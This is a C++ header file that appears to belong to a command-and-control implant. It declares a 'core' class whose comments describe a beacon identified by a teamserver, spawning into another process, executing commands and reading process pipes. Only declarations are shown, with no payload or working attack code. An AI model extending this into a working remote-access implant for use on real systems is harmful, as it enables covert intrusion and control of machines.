#pragma once
#include<string>
#include "Windows.h"

#pragma once
struct PROCESS_INFO {
	PPROCESS_INFORMATION pi;
	HANDLE stdIn;
	HANDLE stdOut;
};

class core
{

public:
	static core* instance;
	static bool terminated;
	static PROCESS_INFO* persistent_process;

	static int sleepTime;
	//static Communicator *communicator;
	std::string identifier = ""; // this will be the identifier used by teamserver to distinct different beacons

	core();
	// we need this contructor in order to be able to force set the identifier (used to spawn the beacon to another process)
	core(std::string identifier);

	// NOTE: cmd is not the actual command for CMD.exe or POWERSHELL.exe, but the command ready to be processed by beacon
	void execute_command(std::string cmd);

	static bool invalid_char(char c);

	static void read_pipe(HANDLE rdPipe);

	static void read_pipe_once(HANDLE rdPipe);

private:
};

